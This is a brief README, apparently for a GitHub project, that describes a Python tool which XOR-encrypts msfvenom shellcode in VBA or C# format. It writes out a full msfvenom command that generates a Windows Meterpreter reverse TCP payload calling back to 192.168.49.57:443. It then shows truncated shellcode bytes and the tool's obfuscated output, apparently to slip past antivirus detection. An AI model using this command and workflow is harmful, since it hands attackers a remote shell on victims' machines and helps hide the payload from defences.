# XOR_Payload_encryption
This project is ment to be use as an encryptor shellcode produced by msfvenom for :

"-f vbapplication" 
"-f csharp"




it does automatically detect the payload format.


➜  ~ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.57 LPORT=443 EXITFUNC=thread -f vbapplication <br/>

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br/>
[-] No arch selected, selecting arch: x86 from the payload<br/>
No encoder specified, outputting raw payload<br/>
Payload size: 375 bytes<br/>
Final size of vbapplication file: 1302 bytes
buf = Array(252,232,143,0,0,0,96,13.....<br/>



Then you run :<br/>

python3 xorcharp.py 'buf = Array(252,232,143,0,0,0,96,137,229,49,210,100,139,82,48,139   <br/>
<br/>
<br/>
<br/>
<br/>


Counter:  379
Key:  0xdb
Key:  219
buf =  Array(39, 51, 84, 219, 219, 219, 187, 82, 62



